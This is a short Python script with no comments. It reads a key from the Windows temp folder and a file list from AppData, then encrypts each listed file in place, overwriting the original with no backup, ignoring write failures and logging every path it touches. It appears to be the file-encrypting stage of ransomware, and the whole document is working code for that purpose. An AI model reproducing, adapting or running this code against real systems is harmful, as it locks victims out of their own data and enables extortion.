import sys
from cryptography.fernet import Fernet
import os

encrypted_list=[]

appdata_dir = os.path.expandvars(r"%APPDATA%")
temp_dir = os.path.expandvars(r"%tmp%")

key_file_path = os.path.join(temp_dir, "pass.key")

with open(key_file_path, "rb") as key_file:
    encryption_key = key_file.read()

fernet = Fernet(encryption_key)

file_list_path = os.path.join(appdata_dir, "allfiles.txt")

if sys.argv[1] == file_list_path:
    with open(file_list_path, 'r') as f:
        file_list = f.read().strip().split(',')
else:
    file_list = sys.argv[1].strip().split(",")

for file_path in file_list:
    if os.path.exists(file_path) and file_path != file_list_path:
        with open(file_path, "rb") as f:
            original_data = f.read()

        encrypted_data = fernet.encrypt(original_data)
        try:
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
        except:
            pass

        encrypted_log_path = os.path.join(appdata_dir, "encrypted_files.txt")
        encrypted_list.append(file_path)
        with open(encrypted_log_path, "a") as log_file:
            log_file.write(f"{file_path}\n")
	
    else:
        print(f"File '{file_path}' does not exist.")

print(f"Files {encrypted_list} have been successfully encrypted.")
